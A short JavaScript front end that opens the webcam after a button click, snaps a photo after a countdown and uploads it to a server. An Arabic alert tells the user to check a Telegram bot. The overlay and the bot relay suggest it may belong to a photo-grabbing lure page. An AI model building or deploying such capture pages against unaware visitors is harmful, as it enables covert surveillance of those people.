
const btn = document.getElementById('captureBtn');
const overlay = document.getElementById('overlay');
const countdownEl = document.getElementById('countdown');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

btn.onclick = async () => {
  overlay.style.display = 'none';
  video.style.display = 'block';
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  video.srcObject = stream;

  let count = 3;
  countdownEl.style.display = 'block';
  countdownEl.innerText = count;
  const timer = setInterval(() => {
    count--;
    if (count > 0) {
      countdownEl.innerText = count;
    } else {
      clearInterval(timer);
      countdownEl.innerText = '';
      countdownEl.style.display = 'none';
      captureAndSend();
    }
  }, 1000);
};

function captureAndSend() {
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  const dataURL = canvas.toDataURL('image/png');
  fetch('/upload', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ image: dataURL })
  }).then(() => {
    alert('تم الإرسال! تحقق من بوت Telegram');
    window.location.reload();
  });
}
